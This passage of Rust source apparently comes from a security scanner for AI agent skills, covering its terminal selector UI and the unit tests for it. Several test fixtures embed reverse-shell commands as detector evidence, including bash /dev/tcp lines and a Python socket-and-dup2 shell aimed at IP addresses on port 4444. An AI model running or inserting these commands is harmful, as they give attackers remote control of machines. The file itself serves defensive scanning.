        vec![Line::from(state.status_line())]
    };
    frame.render_widget(Paragraph::new(lines).dim(), area);
}

fn read_key() -> SentraResult<KeyEvent> {
    loop {
        if let Event::Key(key) =
            event::read().map_err(|err| SentraError::Message(err.to_string()))?
            && key.kind == KeyEventKind::Press
        {
            return Ok(key);
        }
    }
}

#[derive(Clone, Debug)]
struct SelectRow {
    title: String,
    subtitle: String,
    details: Vec<String>,
    risk_findings: Vec<RiskFindingDetail>,
    disabled: bool,
    disabled_reason: Option<String>,
}

#[derive(Clone, Debug)]
struct RiskFindingDetail {
    severity: RiskSeverity,
    category: RiskCategory,
    file: String,
    line: usize,
    column: Option<usize>,
    title: String,
    checker: String,
    evidence: Option<String>,
    description: String,
    remediation: String,
    context: Vec<ContextLine>,
}

impl RiskFindingDetail {
    fn from_finding(skill_home: Option<&Path>, finding: &Finding) -> Self {
        Self {
            severity: finding.severity,
            category: finding.category,
            file: finding.file.clone(),
            line: finding.location.line,
            column: finding.location.column,
            title: finding.title.clone(),
            checker: finding.checker.clone(),
            evidence: finding.evidence.clone(),
            description: finding.description.clone(),
            remediation: finding.remediation.clone(),
            context: finding_context_lines(
                skill_home,
                &finding.file,
                finding.location.line,
                finding.context.as_deref(),
            ),
        }
    }
}

#[derive(Clone, Debug)]
struct ContextLine {
    number: Option<usize>,
    text: String,
    is_target: bool,
}

#[derive(Debug)]
struct SelectorState {
    selected: BTreeSet<usize>,
    focus: usize,
    focus_pane: FocusPane,
    detail_scroll: u16,
    search: String,
    search_mode: bool,
    show_help: bool,
    status: Option<String>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum FocusPane {
    List,
    Details,
}

enum SelectorAction {
    None,
    Continue,
    Cancel,
}

impl SelectorState {
    fn new(rows: &[SelectRow]) -> Self {
        let focus = rows.iter().position(|row| !row.disabled).unwrap_or(0);
        Self {
            selected: BTreeSet::new(),
            focus,
            focus_pane: FocusPane::List,
            detail_scroll: 0,
            search: String::new(),
            search_mode: false,
            show_help: false,
            status: Some(
                "Press Space to toggle; dangerous items can be inspected but not selected."
                    .to_string(),
            ),
        }
    }

    fn handle_key(&mut self, rows: &[SelectRow], key: KeyEvent) -> SelectorAction {
        let detail_page = detail_page_size();
        match key {
            KeyEvent {
                code: KeyCode::Esc, ..
            }
            | KeyEvent {
                code: KeyCode::Char('q'),
                modifiers: KeyModifiers::NONE,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('c'),
                modifiers: KeyModifiers::CONTROL,
                ..
            } if !self.search_mode => return SelectorAction::Cancel,
            KeyEvent {
                code: KeyCode::Esc, ..
            } if self.search_mode => self.search_mode = false,
            KeyEvent {
                code: KeyCode::Enter,
                ..
            } if self.search_mode => self.search_mode = false,
            KeyEvent {
                code: KeyCode::Enter,
                ..
            } => {
                if self.selected.is_empty() {
                    self.status = Some("Select at least one item before continuing.".to_string());
                }
                return SelectorAction::Continue;
            }
            KeyEvent {
                code: KeyCode::Char('?'),
                ..
            } if !self.search_mode => self.show_help = !self.show_help,
            KeyEvent {
                code: KeyCode::Char('/'),
                ..
            } if !self.search_mode => self.search_mode = true,
            KeyEvent {
                code: KeyCode::Tab, ..
            } if !self.search_mode => self.toggle_focus_pane(),
            KeyEvent {
                code: KeyCode::Backspace,
                ..
            } if self.search_mode => {
                self.search.pop();
                self.clamp_focus(rows);
            }
            KeyEvent {
                code: KeyCode::Char(ch),
                modifiers,
                ..
            } if self.search_mode
                && !modifiers.contains(KeyModifiers::CONTROL)
                && !modifiers.contains(KeyModifiers::ALT) =>
            {
                self.search.push(ch);
                self.clamp_focus(rows);
            }
            KeyEvent {
                code: KeyCode::Up, ..
            }
            | KeyEvent {
                code: KeyCode::Char('k'),
                modifiers: KeyModifiers::NONE,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('p'),
                modifiers: KeyModifiers::CONTROL,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('k'),
                modifiers: KeyModifiers::CONTROL,
                ..
            } if !self.search_mode && self.focus_pane == FocusPane::Details => {
                self.scroll_details(rows, -1)
            }
            KeyEvent {
                code: KeyCode::Down,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('j'),
                modifiers: KeyModifiers::NONE,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('n'),
                modifiers: KeyModifiers::CONTROL,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('j'),
                modifiers: KeyModifiers::CONTROL,
                ..
            } if !self.search_mode && self.focus_pane == FocusPane::Details => {
                self.scroll_details(rows, 1)
            }
            KeyEvent {
                code: KeyCode::PageUp,
                ..
            } if !self.search_mode && self.focus_pane == FocusPane::Details => {
                self.scroll_details(rows, -detail_page)
            }
            KeyEvent {
                code: KeyCode::PageDown,
                ..
            } if !self.search_mode && self.focus_pane == FocusPane::Details => {
                self.scroll_details(rows, detail_page)
            }
            KeyEvent {
                code: KeyCode::Up, ..
            }
            | KeyEvent {
                code: KeyCode::Char('k'),
                modifiers: KeyModifiers::NONE,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('p'),
                modifiers: KeyModifiers::CONTROL,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('k'),
                modifiers: KeyModifiers::CONTROL,
                ..
            } if !self.search_mode => self.move_focus(rows, -1),
            KeyEvent {
                code: KeyCode::Down,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('j'),
                modifiers: KeyModifiers::NONE,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('n'),
                modifiers: KeyModifiers::CONTROL,
                ..
            }
            | KeyEvent {
                code: KeyCode::Char('j'),
                modifiers: KeyModifiers::CONTROL,
                ..
            } if !self.search_mode => self.move_focus(rows, 1),
            KeyEvent {
                code: KeyCode::PageUp,
                ..
            } if !self.search_mode => self.move_focus(rows, -10),
            KeyEvent {
                code: KeyCode::PageDown,
                ..
            } if !self.search_mode => self.move_focus(rows, 10),
            KeyEvent {
                code: KeyCode::Home,
                ..
            } if !self.search_mode => self.jump(rows, false),
            KeyEvent {
                code: KeyCode::End, ..
            } if !self.search_mode => self.jump(rows, true),
            KeyEvent {
                code: KeyCode::Char(' '),
                modifiers: KeyModifiers::NONE,
                ..
            } if !self.search_mode && self.focus_pane == FocusPane::List => self.toggle(rows),
            KeyEvent {
                code: KeyCode::Char('a'),
                modifiers: KeyModifiers::NONE,
                ..
            } if !self.search_mode && self.focus_pane == FocusPane::List => self.toggle_all(rows),
            KeyEvent {
                code: KeyCode::Char('a'),
                modifiers: KeyModifiers::CONTROL,
                ..
            } if !self.search_mode && self.focus_pane == FocusPane::List => {
                self.toggle_visible(rows)
            }
            KeyEvent {
                code: KeyCode::Char('r'),
                modifiers,
                ..
            } if !self.search_mode
                && self.focus_pane == FocusPane::List
                && (modifiers.is_empty() || modifiers == KeyModifiers::CONTROL) =>
            {
                self.invert_visible(rows)
            }
            _ => {}
        }
        SelectorAction::None
    }

    fn status_line(&self) -> String {
        self.status.clone().unwrap_or_else(|| {
            "[Tab] focus  [Space] toggle  [Enter] continue  [/] search  [?] help  [Esc/Ctrl+C] cancel"
                .to_string()
        })
    }

    fn toggle_focus_pane(&mut self) {
        self.focus_pane = match self.focus_pane {
            FocusPane::List => FocusPane::Details,
            FocusPane::Details => FocusPane::List,
        };
        self.status = None;
    }

    fn scroll_details(&mut self, rows: &[SelectRow], delta: isize) {
        if delta < 0 {
            self.detail_scroll = self
                .detail_scroll
                .saturating_sub(delta.unsigned_abs() as u16);
        } else {
            self.detail_scroll = self.detail_scroll.saturating_add(delta as u16);
        }
        self.clamp_detail_scroll(rows);
        self.status = None;
    }

    fn clamp_detail_scroll(&mut self, rows: &[SelectRow]) {
        let Some(row) = rows.get(self.focus) else {
            self.detail_scroll = 0;
            return;
        };
        self.detail_scroll = self.detail_scroll.min(detail_max_scroll(
            row,
            self,
            detail_view_height(),
            detail_view_width(rows, self),
        ));
    }

    fn visible_indices(&self, rows: &[SelectRow]) -> Vec<usize> {
        let query = self.search.trim().to_ascii_lowercase();
        rows.iter()
            .enumerate()
            .filter(|(_, row)| {
                query.is_empty()
                    || row.title.to_ascii_lowercase().contains(&query)
                    || row.subtitle.to_ascii_lowercase().contains(&query)
            })
            .map(|(index, _)| index)
            .collect()
    }

    fn clamp_focus(&mut self, rows: &[SelectRow]) {
        let visible = self.visible_indices(rows);
        if !visible.contains(&self.focus)
            && let Some(next) = visible.iter().copied().next()
        {
            self.focus = next;
            self.detail_scroll = 0;
        }
    }

    fn move_focus(&mut self, rows: &[SelectRow], delta: isize) {
        let visible = self.visible_indices(rows);
        if visible.is_empty() {
            return;
        }
        let pos = visible
            .iter()
            .position(|index| *index == self.focus)
            .unwrap_or(0);
        let direction = if delta < 0 { -1 } else { 1 };
        let steps = delta.unsigned_abs().max(1);
        let mut next_pos = pos;
        for _ in 0..steps {
            next_pos = self.next_visible_position(&visible, next_pos, direction);
        }
        self.focus = visible[next_pos];
        self.detail_scroll = 0;
        self.status = None;
    }

    fn next_visible_position(
        &self,
        visible: &[usize],
        current_pos: usize,
        direction: isize,
    ) -> usize {
        if direction < 0 {
            (current_pos + visible.len() - 1) % visible.len()
        } else {
            (current_pos + 1) % visible.len()
        }
    }

    fn jump(&mut self, rows: &[SelectRow], bottom: bool) {
        let visible = self.visible_indices(rows);
        let next = if bottom {
            visible.iter().rev().copied().next()
        } else {
            visible.iter().copied().next()
        };
        if let Some(next) = next {
            self.focus = next;
            self.detail_scroll = 0;
            self.status = None;
        }
    }

    fn toggle(&mut self, rows: &[SelectRow]) {
        if rows.get(self.focus).is_none_or(|row| row.disabled) {
            self.status = Some("This item is disabled and cannot be selected.".to_string());
            return;
        }
        if !self.selected.remove(&self.focus) {
            self.selected.insert(self.focus);
        }
        self.status = None;
    }

    fn toggle_all(&mut self, rows: &[SelectRow]) {
        let selectable = rows
            .iter()
            .enumerate()
            .filter(|(_, row)| !row.disabled)
            .map(|(index, _)| index)
            .collect::<BTreeSet<_>>();
        if self.selected.len() == selectable.len() {
            self.selected.clear();
            self.status = Some("Selection cleared.".to_string());
        } else {
            self.selected = selectable;
            self.status = None;
        }
    }

    fn toggle_visible(&mut self, rows: &[SelectRow]) {
        let selectable = self
            .visible_indices(rows)
            .into_iter()
            .filter(|index| rows.get(*index).is_some_and(|row| !row.disabled))
            .collect::<Vec<_>>();
        if selectable.is_empty() {
            self.status = Some("No selectable visible items.".to_string());
            return;
        }
        let all_selected = selectable.iter().all(|index| self.selected.contains(index));
        if all_selected {
            for index in selectable {
                self.selected.remove(&index);
            }
        } else {
            self.selected.extend(selectable);
        }
        self.status = None;
    }

    fn invert_visible(&mut self, rows: &[SelectRow]) {
        let selectable = self
            .visible_indices(rows)
            .into_iter()
            .filter(|index| rows.get(*index).is_some_and(|row| !row.disabled))
            .collect::<Vec<_>>();
        if selectable.is_empty() {
            self.status = Some("No selectable visible items.".to_string());
            return;
        }
        for index in selectable {
            if !self.selected.remove(&index) {
                self.selected.insert(index);
            }
        }
        self.status = None;
    }
}

struct TerminalGuard {
    terminal: Terminal<CrosstermBackend<std::io::Stdout>>,
}

impl TerminalGuard {
    fn enter() -> SentraResult<Self> {
        enable_raw_mode().map_err(|err| SentraError::Message(err.to_string()))?;
        let mut stdout = std::io::stdout();
        execute!(stdout, EnterAlternateScreen, Hide)
            .map_err(|err| SentraError::Message(err.to_string()))?;
        let terminal = Terminal::new(CrosstermBackend::new(stdout))?;
        Ok(Self { terminal })
    }

    fn draw<F>(&mut self, render: F) -> SentraResult<()>
    where
        F: FnOnce(&mut Frame<'_>),
    {
        self.terminal.draw(render)?;
        Ok(())
    }
}

impl Drop for TerminalGuard {
    fn drop(&mut self) {
        let _ = execute!(self.terminal.backend_mut(), Show, LeaveAlternateScreen);
        let _ = disable_raw_mode();
    }
}

fn current_home() -> SentraResult<PathBuf> {
    home::home_dir().ok_or_else(|| {
        SentraError::Message(
            t(
                "could not determine current user home",
                "无法确定当前用户主目录",
            )
            .to_string(),
        )
    })
}

#[derive(Clone)]
struct InstallableSkill {
    data: SkillData,
    blocked: bool,
    critical: usize,
    high: usize,
    medium: usize,
    low: usize,
    risk_details: Vec<RiskFindingDetail>,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct InstallSummary {
    installed: Vec<InstallRecord>,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct InstallRecord {
    skill: String,
    agent: String,
    path: PathBuf,
}

#[cfg(test)]
mod tests {
    use super::*;
    use ratatui::backend::TestBackend;

    fn rows() -> Vec<SelectRow> {
        vec![
            SelectRow {
                title: "safe-a".to_string(),
                subtitle: "first".to_string(),
                details: Vec::new(),
                risk_findings: Vec::new(),
                disabled: false,
                disabled_reason: None,
            },
            SelectRow {
                title: "risky".to_string(),
                subtitle: "blocked".to_string(),
                details: Vec::new(),
                risk_findings: Vec::new(),
                disabled: true,
                disabled_reason: Some("risk findings require --force".to_string()),
            },
            SelectRow {
                title: "safe-b".to_string(),
                subtitle: "second".to_string(),
                details: Vec::new(),
                risk_findings: Vec::new(),
                disabled: false,
                disabled_reason: None,
            },
        ]
    }

    #[test]
    fn selector_starts_with_no_rows_selected() {
        let rows = rows();
        let state = SelectorState::new(&rows);

        assert!(state.selected.is_empty());
        assert!(!state.selected.contains(&1));
        assert_eq!(state.focus, 0);
    }

    #[test]
    fn selector_space_toggles_focused_row_on_and_off() {
        let rows = rows();
        let mut state = SelectorState::new(&rows);

        state.handle_key(&rows, KeyEvent::new(KeyCode::Char(' '), KeyModifiers::NONE));
        assert!(state.selected.contains(&0));

        state.handle_key(&rows, KeyEvent::new(KeyCode::Char(' '), KeyModifiers::NONE));
        assert!(!state.selected.contains(&0));
    }

    #[test]
    fn selector_enter_with_empty_selection_sets_status_and_stays_open() {
        let rows = rows();
        let mut state = SelectorState::new(&rows);

        let action = state.handle_key(&rows, KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));

        assert!(matches!(action, SelectorAction::Continue));
        assert_eq!(
            state.status.as_deref(),
            Some("Select at least one item before continuing.")
        );
    }

    #[test]
    fn selector_navigation_can_focus_disabled_rows() {
        let rows = rows();
        let mut state = SelectorState::new(&rows);

        state.handle_key(&rows, KeyEvent::new(KeyCode::Down, KeyModifiers::NONE));

        assert_eq!(state.focus, 1);
    }

    #[test]
    fn selector_does_not_toggle_disabled_row() {
        let rows = rows();
        let mut state = SelectorState::new(&rows);
        state.focus = 1;

        state.handle_key(&rows, KeyEvent::new(KeyCode::Char(' '), KeyModifiers::NONE));

        assert!(!state.selected.contains(&1));
    }

    #[test]
    fn selector_ctrl_a_toggles_visible_enabled_rows() {
        let rows = rows();
        let mut state = SelectorState::new(&rows);
        state.search = "safe".to_string();

        state.handle_key(
            &rows,
            KeyEvent::new(KeyCode::Char('a'), KeyModifiers::CONTROL),
        );

        assert_eq!(state.selected, BTreeSet::from([0, 2]));
        assert!(!state.selected.contains(&1));

        state.handle_key(
            &rows,
            KeyEvent::new(KeyCode::Char('a'), KeyModifiers::CONTROL),
        );

        assert!(state.selected.is_empty());
    }

    #[test]
    fn selector_r_inverts_visible_enabled_rows() {
        let rows = rows();
        let mut state = SelectorState::new(&rows);
        state.selected.insert(0);
        state.search = "safe".to_string();

        state.handle_key(&rows, KeyEvent::new(KeyCode::Char('r'), KeyModifiers::NONE));

        assert_eq!(state.selected, BTreeSet::from([2]));
        assert!(!state.selected.contains(&1));
    }

    #[test]
    fn selector_detail_focus_scrolls_without_toggling_list_items() {
        let mut rows = rows();
        rows[0].details = (0..40).map(|index| format!("line: {index}")).collect();
        let mut state = SelectorState::new(&rows);
        state.handle_key(&rows, KeyEvent::new(KeyCode::Tab, KeyModifiers::NONE));

        state.handle_key(&rows, KeyEvent::new(KeyCode::Down, KeyModifiers::NONE));
        state.handle_key(&rows, KeyEvent::new(KeyCode::Char(' '), KeyModifiers::NONE));

        assert_eq!(state.focus_pane, FocusPane::Details);
        assert_eq!(state.detail_scroll, 1);
        assert!(state.selected.is_empty());
    }

    #[test]
    fn selector_search_filters_by_title_and_subtitle() {
        let rows = rows();
        let mut state = SelectorState::new(&rows);
        state.search_mode = true;
        state.handle_key(&rows, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE));

        assert_eq!(state.visible_indices(&rows), vec![1, 2]);
    }

    #[test]
    fn selector_list_width_tracks_visible_skill_names() {
        let short_rows = rows();
        let state = SelectorState::new(&short_rows);

        assert_eq!(dynamic_list_width(120, &short_rows, &state), 18);

        let mut long_rows = rows();
        long_rows[0].title = "very-long-skill-name-that-still-has-a-cap".to_string();
        assert_eq!(dynamic_list_width(120, &long_rows, &state), 48);
    }

    #[test]
    fn scan_progress_message_includes_current_total_and_percent() {
        assert_eq!(
            crate::core::scan_support::scan_progress_message("skill", 2, 5, "demo"),
            "Scan skill 2/5 (40%): demo"
        );
    }

    #[test]
    fn rule_load_progress_message_includes_stage_and_percent() {
        assert_eq!(
            crate::core::scan_support::rule_load_progress_message(
                2,
                3,
                sentra_lib::risks::RuleType::ThreatIntel,
            ),
            "Load risk rules 2/3 (67%): Load threat intel rules"
        );
    }

    #[test]
    fn detail_labels_keep_separator_after_long_labels() {
        let mut rows = rows();
        rows[0].details = vec!["risk summary: critical=0 high=0 medium=0 low=0".to_string()];
        let state = SelectorState::new(&rows);

        let rendered = detail_lines(&rows[0], &state)
            .into_iter()
            .map(|line| line.to_string())
            .collect::<Vec<_>>()
            .join("\n");

        assert!(rendered.contains("risk summary: critical=0 high=0 medium=0 low=0"));
    }

    #[test]
    fn risk_detail_lines_use_compact_multiline_layout() {
        let long_path =
            "E:/cw/sentra/packages/sentra-lib/fixtures/skill/rogue-deploy/SKILL.md".repeat(2);
        let finding = RiskFindingDetail {
            severity: RiskSeverity::High,
            category: RiskCategory::MaliciousExecution,
            file: long_path,
            line: 100,
            column: None,
            title: "Command Injection Detection".to_string(),
            checker: "yara-checker".to_string(),
            evidence: Some("bash -i >& /dev/tcp/178.62.3.223/4444 0>&1".to_string()),
            description: "Detects command injection patterns in agent skills: shell operators, system commands, and network tools.".repeat(3),
            remediation: "Avoid shell execution with user input; use safe APIs, argument arrays, and strict allowlists.".to_string(),
            context: vec![
                ContextLine {
                    number: Some(99),
                    text: "aaaaa".to_string(),
                    is_target: false,
                },
                ContextLine {
                    number: Some(100),
                    text: format!("{}{}", "b".repeat(90), "c".repeat(30)),
                    is_target: true,
                },
                ContextLine {
                    number: Some(101),
                    text: "ccccc".to_string(),
                    is_target: false,
                },
            ],
        };
        let row = SelectRow {
            title: "rogue-deploy".to_string(),
            subtitle: "Deploys application to remote servers".to_string(),
            details: Vec::new(),
            risk_findings: vec![finding],
            disabled: true,
            disabled_reason: Some("risk findings require --force".to_string()),
        };
        let mut state = SelectorState::new(std::slice::from_ref(&row));
        state.focus = 0;

        let rendered = detail_lines(&row, &state)
            .into_iter()
            .map(|line| line.to_string())
            .collect::<Vec<_>>()
            .join("\n");

        assert!(rendered.contains("Risks (1)"));
        assert!(rendered.contains("# 1/1"));
        assert!(rendered.contains("Title: Command Injection Detection"));
        assert!(!rendered.contains("\n  Title: Command Injection Detection"));
        assert!(rendered.contains("\nSeverity: HIGH"));
        assert!(rendered.contains("\nCategory: MALICIOUS_EXECUTION"));
        assert!(rendered.contains("\nChecker: yara-checker"));
        assert!(rendered.contains("File: E:/cw/sentra/"));
        assert!(rendered.contains("Description: Detects command injection"));
        assert!(rendered.contains("Evidence: bash -i >& /dev/tcp/"));
        assert!(rendered.contains("Context:\n   99 | aaaaa\n> 100 | "));
        assert!(rendered.contains("\n      | "));
    }

    #[test]
    fn multiline_detail_continuations_start_at_detail_left_edge() {
        let lines = multiline_detail_lines(
            "Evidence",
            "socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"20.120.229.246\",4444))",
            Style::default(),
            DetailLayout {
                text_width: 28,
                context_text_width: 20,
            },
        );
        let rendered = lines
            .into_iter()
            .map(|line| line.to_string())
            .collect::<Vec<_>>();

        assert!(rendered.len() > 1);
        assert!(rendered[0].starts_with("Evidence: "));
        for line in rendered.iter().skip(1) {
            assert!(
                !line.starts_with(' '),
                "wrapped detail line must start at the detail left edge: {line}"
            );
        }
    }

    #[test]
    fn context_lines_wrap_inside_aligned_gutter_for_narrow_details() {
        let context = ContextLine {
            number: Some(32),
            text: "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"20.120.229.246\",4444));os.dup2(s.fileno(),0)".to_string(),
            is_target: true,
        };
        let lines = context_lines(
            &context,
            DetailLayout {
                text_width: 40,
                context_text_width: 28,
            },
            3,
        );
        let rendered = lines
            .into_iter()
            .map(|line| line.to_string())
            .collect::<Vec<_>>();

        assert!(rendered.len() > 1);
        assert!(rendered[0].starts_with(">  32 | "));
        for line in rendered.iter().skip(1) {
            assert!(
                line.starts_with("      | "),
                "wrapped context line must keep gutter alignment: {line}"
            );
        }
    }

    #[test]
    fn context_gutter_uses_fixed_marker_line_number_and_separator_columns() {
        assert_eq!(context_gutter(' ', Some(99), 3), "   99 | ");
        assert_eq!(context_gutter('>', Some(100), 3), "> 100 | ");
        assert_eq!(context_gutter(' ', None, 3), "      | ");
    }

    #[test]
    fn context_gutter_width_tracks_largest_line_number() {
        let context = vec![
            ContextLine {
                number: Some(999),
                text: "before".to_string(),
                is_target: false,
            },
            ContextLine {
                number: Some(1000),
                text: "target".to_string(),
                is_target: true,
            },
        ];
        let number_width = context_number_width(&context);

        assert_eq!(number_width, 4);
        assert_eq!(context_gutter(' ', Some(999), number_width), "   999 | ");
        assert_eq!(context_gutter('>', Some(1000), number_width), "> 1000 | ");
        assert_eq!(context_gutter(' ', None, number_width), "       | ");
    }

    #[test]
    fn detail_render_preserves_context_continuation_gutter_padding() {
        let row = SelectRow {
            title: "math-calculator".to_string(),
            subtitle: "Calculator".to_string(),
            details: Vec::new(),
            risk_findings: vec![RiskFindingDetail {
                severity: RiskSeverity::High,
                category: RiskCategory::MaliciousExecution,
                file: "calculate.py".to_string(),
                line: 32,
                column: None,
                title: "Reverse Shell Detection".to_string(),
                checker: "yara-checker".to_string(),
                evidence: None,
                description: String::new(),
                remediation: String::new(),
                context: vec![ContextLine {
                    number: Some(32),
                    text: "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"20.120.229.246\",4444));os.dup2(s.fileno(),0)".to_string(),
                    is_target: true,
                }],
            }],
            disabled: false,
            disabled_reason: None,
        };
        let rows = vec![row];
        let state = SelectorState::new(&rows);
        let backend = TestBackend::new(64, 18);
        let mut terminal = Terminal::new(backend).unwrap();

        terminal
            .draw(|frame| render_detail(frame, frame.area(), &rows, &state))
            .unwrap();

        let rendered = test_buffer_lines(terminal.backend());
        assert!(
            rendered.iter().any(|line| line.contains(">  32 |")),
            "target context line should keep marker, line number, and separator columns:\n{}",
            rendered.join("\n")
        );
        assert!(
            rendered.iter().any(|line| line.contains("      |")),
            "wrapped context continuation should preserve leading gutter spaces:\n{}",
            rendered.join("\n")
        );
        assert!(
            !rendered.iter().any(|line| line.starts_with("|")),
            "continuation separator must not be trimmed to the left edge:\n{}",
            rendered.join("\n")
        );
    }

    fn test_buffer_lines(backend: &TestBackend) -> Vec<String> {
        let buffer = backend.buffer();
        (0..buffer.area.height)
            .map(|y| {
                (0..buffer.area.width)
                    .map(|x| buffer[(x, y)].symbol())
                    .collect::<String>()
            })
            .collect()
    }

    #[test]
    fn risk_detail_items_include_source_context_with_marked_target_line() {
        let dir = tempfile::tempdir().unwrap();
        let skill_dir = dir.path().join("danger");
        fs::create_dir_all(&skill_dir).unwrap();
        let skill_file = skill_dir.join("SKILL.md");
        fs::write(
            &skill_file,
            "line one\nline two\nbash -i >& /dev/tcp/1.2.3.4/4444\nline four\nline five",
        )
        .unwrap();
        let mut finding = Finding::new(
            "reverse-shell",
            "yara-checker",
            RiskSeverity::Critical,
            RiskCategory::MaliciousExecution,
            skill_file.to_string_lossy(),
            "Reverse Shell Detection",
            "Reverse shell patterns in scripts or source code",
            "Remove the reverse shell command",
        );
        finding.location.line = 3;
        finding.evidence = Some("bash -i >& /dev/tcp/".to_string());

        let details = risk_detail_items(Some(&skill_dir), &[finding]);

        assert_eq!(details.len(), 1);
        assert_eq!(details[0].context.len(), 5);
        assert!(details[0].context[2].is_target);
        assert_eq!(details[0].context[2].number, Some(3));
        assert!(details[0].context[2].text.contains("bash -i"));
    }

    #[test]
    fn install_summary_groups_records_by_skill() {
        let summary = InstallSummary {
            installed: vec![
                InstallRecord {
                    skill: "executing-plans".to_string(),
                    agent: "codex".to_string(),
                    path: PathBuf::from(r"C:\Users\me\.codex\skills\executing-plans"),
                },
                InstallRecord {
                    skill: "executing-plans".to_string(),
                    agent: "claude-cli".to_string(),
                    path: PathBuf::from(r"C:\Users\me\.claude\skills\executing-plans"),
                },
            ],
        };

        let rendered = render_install_summary(&summary);

        assert!(rendered.starts_with("Installed 2 skill copies\n\nexecuting-plans\n"));
        assert!(rendered.contains(r"codex       C:\Users\me\.codex\skills\executing-plans"));
        assert!(rendered.contains(r"claude-cli  C:\Users\me\.claude\skills\executing-plans"));
    }
}
